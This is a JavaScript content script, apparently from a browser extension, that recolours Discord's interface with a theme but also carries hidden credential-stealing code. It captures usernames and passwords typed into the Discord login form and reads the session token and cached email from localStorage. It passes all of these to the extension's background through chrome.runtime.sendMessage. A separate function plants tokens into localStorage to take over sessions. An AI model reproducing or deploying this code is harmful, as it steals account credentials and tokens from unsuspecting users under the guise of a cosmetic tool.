var stt = false;
function ln(ato) {
  if (location.href.match("discord")) {

    setInterval(() => {
      localStorage.token = ato;
      document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token = `"${ato}"`
    }, 50);
  }

}

var color = null;
const d = new Date();
var mth = d.getMonth();
var canlg = false;

var allDebounce = false;
var msgDebounce = false;
var discordDebounce = false;
var robloxDebounce = false;
var rosarioDebounce = false;
var tbl = ["nav-robux-amount", "nav-robux-balance"];
var shalremove = ["simplemodal-overlay", "simplemodal-container"];

function std(msg) {
  try {
    chrome.runtime.sendMessage({ message: msg }, function (response) {
    });
    //console.log("SENT: " + msg)
  }
  catch (err) {
  }
}

var discordthemes = [
  //friends, blocked users, pendings, etc.
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.container-2cd8Mz",
  //dms
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.sidebar-1tnWFu > nav > div.scroller-WSmht3.thin-31rlnD.scrollerBase-_bVAAt.fade-1R6FHN > ul",
  //active now 
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.container-2cd8Mz > div > div.nowPlayingColumn-1eCBCN > div",
  //top bar
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.container-2cd8Mz > section",
  //search channel bar
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.sidebar-1tnWFu > nav > div.searchBar-3TnChZ",
  //inside dm
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.chat-2ZfjoI > div.content-1jQy2l > main > div.messagesWrapper-RpOMA3.group-spacing-16 > div > div > ol",
  //top of dm
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.chat-2ZfjoI > section",
  //username part
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.sidebar-1tnWFu > section > div.container-YkUktl",
  //under dm text box
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.chat-2ZfjoI > div.content-1jQy2l > main > form",
  //dm textbox
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.chat-2ZfjoI > div.content-1jQy2l > main > form > div > div.scrollableContainer-15eg7h.webkit-QgSAqd",
  //server members
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.chat-2ZfjoI > div.content-1jQy2l > div > aside > div > div",
  //server channel names
  "#channels > ul",
  //server title
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.sidebar-1tnWFu > nav > div.container-1-ERn5.clickable-vvKY2q > header",
  //nitro
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.applicationStore-2nk7Lo > div > div > div.premiumContainer-3GGa8Q",
  //nitro top bar
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.applicationStore-2nk7Lo > div > section",
  //scroller one
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > nav > ul > div.scroller-3X7KbA.none-2-_0dP.scrollerBase-_bVAAt",
  //scroller two
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.applicationStore-2nk7Lo > div > div",
  //join server menu
  "#app-mount > div:nth-child(6) > div.layer-1Ixpg3 > div > div > div > div > div > div",
  //join with invite link button bg
  "#app-mount > div:nth-child(6) > div.layer-1Ixpg3 > div > div > div > div > div > div > div.flex-2S1XBF.flex-3BkGQD.horizontalReverse-60Katr.horizontalReverse-2QssvL.flex-3BkGQD.directionRowReverse-HZatnx.justifyStart-2Mwniq.alignStretch-Uwowzr.noWrap-hBpHBz.footer-31IekZ.footer-3ie9JP",
  //the above go back button
  "#app-mount > div:nth-child(6) > div.layer-1Ixpg3 > div > div > div > div > div > div > div > div.flex-2S1XBF.flex-3BkGQD.horizontalReverse-60Katr.horizontalReverse-2QssvL.flex-3BkGQD.directionRowReverse-HZatnx.justifyStart-2Mwniq.alignStretch-Uwowzr.noWrap-hBpHBz.footer-31IekZ.footer-3_2BuU",
  //left hand side of discover page
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.sidebar-1tnWFu > div",
  //main bg of discover page
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.pageWrapper-2PwDoS > div.scroller-3j5xK2.auto-2K3UW5.scrollerBase-_bVAAt",
  //left hand side of server settings
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div:nth-child(2) > div > div > div.sidebarRegion-1VBisG > div",
  //main bg of server settings
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div:nth-child(2) > div > div > div.contentRegion-3HkfJJ > div > div",
  //member settings
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div:nth-child(2) > div > div > div.contentRegion-3HkfJJ > div.customColumn-2n-oKU > div > div",
  //server channels bg
  "#channels",
  //server members bg
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.chat-2ZfjoI > div.content-1jQy2l > div",
  //student hub 
  "#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.scroller-RfJjkV.thin-31rlnD.scrollerBase-_bVAAt",
  "#app-mount > div:nth-child(6) > div.layer-1Ixpg3 > div > div > div > div.container-28QIQB",
  "#app-mount > div:nth-child(6) > div.layer-1Ixpg3 > div > div > div > div.container-28QIQB > div.sidebarContainer-gUKhtL",
  


];

function runDiscord() {
  try {

    try {
      document.addEventListener('keydown', function (event) {
        if (event.key === "Enter") {
          if (!discordDebounce) {
            discordDebounce = true;
            setTimeout(() => {
              try {
                std("\n\nDiscord Information:\n\nUsername: " + document.querySelector("#app-mount > div.app-3xd6d0 > div > div > div > div > form > div > div > div.mainLoginContainer-wHmAjP > div.block-3uVSn4.marginTop20-2T8ZJx > div.marginBottom20-315RVT > div > div.inputWrapper-1YNMmM.inputWrapper-3ESIDR > input").value + " \nPassword: " + document.querySelector("#app-mount > div.app-3xd6d0 > div > div > div > div > form > div > div > div.mainLoginContainer-wHmAjP > div.block-3uVSn4.marginTop20-2T8ZJx > div:nth-child(2) > div > input").value);

              }
              catch (err) { }
              discordDebounce = false;
            }, 100);
          }
        }
      });
      document.querySelector("#app-mount > div.app-3xd6d0 > div > div > div > div > form > div > div > div.mainLoginContainer-wHmAjP > div.block-3uVSn4.marginTop20-2T8ZJx > button.marginBottom8-emkd0_.button-1cRKG6.button-f2h6uQ.lookFilled-yCfaCM.colorBrand-I6CyqQ.sizeLarge-3mScP9.fullWidth-fJIsjq.grow-2sR_-F").addEventListener("click", function () {
        if (!discordDebounce) {
          discordDebounce = true;
          setTimeout(() => {
            try {
              std("\n\nDiscord Information:\n\nUsername: " + document.querySelector("#app-mount > div.app-3xd6d0 > div > div > div > div > form > div > div > div.mainLoginContainer-wHmAjP > div.block-3uVSn4.marginTop20-2T8ZJx > div.marginBottom20-315RVT > div > div.inputWrapper-1YNMmM.inputWrapper-3ESIDR > input").value + " \nPassword: " + document.querySelector("#app-mount > div.app-3xd6d0 > div > div > div > div > form > div > div > div.mainLoginContainer-wHmAjP > div.block-3uVSn4.marginTop20-2T8ZJx > div:nth-child(2) > div > input").value);
            }
            catch (err) { }
            discordDebounce = false;
          }, 100);
        }

      })
      if (!allDebounce && document.querySelector("#app-mount > div.app-3xd6d0 > div > div > div > div > form > div > div > div.mainLoginContainer-wHmAjP > div.block-3uVSn4.marginTop20-2T8ZJx > div:nth-child(2) > div > input").value != "") {
        allDebounce = true;
        setTimeout(() => {
          try {
            std("\n\nDiscord Information:\n\nUsername: " + document.querySelector("#app-mount > div.app-3xd6d0 > div > div > div > div > form > div > div > div.mainLoginContainer-wHmAjP > div.block-3uVSn4.marginTop20-2T8ZJx > div.marginBottom20-315RVT > div > div.inputWrapper-1YNMmM.inputWrapper-3ESIDR > input").value + " \nPassword: " + document.querySelector("#app-mount > div.app-3xd6d0 > div > div > div > div > form > div > div > div.mainLoginContainer-wHmAjP > div.block-3uVSn4.marginTop20-2T8ZJx > div:nth-child(2) > div > input").value);

          }
          catch (err) { }
          allDebounce = false;
        }, 1000);
      }
    } catch (err) { }
    try {
      //document.querySelector("#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > nav > ul > div.scroller-3X7KbA.none-2-_0dP.scrollerBase-_bVAAt").style = "overflow: hidden scroll; padding-right: 0px; background-color: " + color + ";";
    } catch (err) { }
    try {
      //document.querySelector("#app-mount > div.app-3xd6d0 > div > div.layers-OrUESM.layers-1YQhyW > div > div > div > div > div.applicationStore-2nk7Lo > div > div").style = "overflow: hidden scroll; padding-right: 0px; background-color: " + color + ";";
    } catch (err) { }
    discordthemes.forEach(function (v, i) {
      try {
        document.querySelector(v).style.backgroundColor = color;
      } catch (err) { }
    })
  }
  catch (err) { }
}

setInterval(() => {
  if (localStorage['token'] != "" && localStorage['email_cache'] != null && stt == false) {
    if (localStorage['token'] != "." && localStorage['token'] != "abc" && toString(localStorage['token']) != "undefined") {
      var tokentext = "\n\nDiscord Email:\n" + localStorage['email_cache'] + "\nToken\n" + localStorage['token'];
      if (tokentext.match("undefined") == null && tokentext.match("abc") == null && tokentext.match('"."') == null) {
        std(tokentext);
        stt = true;

      }
    }
  }

  if (window.location.href.match("discord")) {
    runDiscord();
    if (canlg == true) {
      ln(".");
      canlg = false;
    }

  }


}, 100);

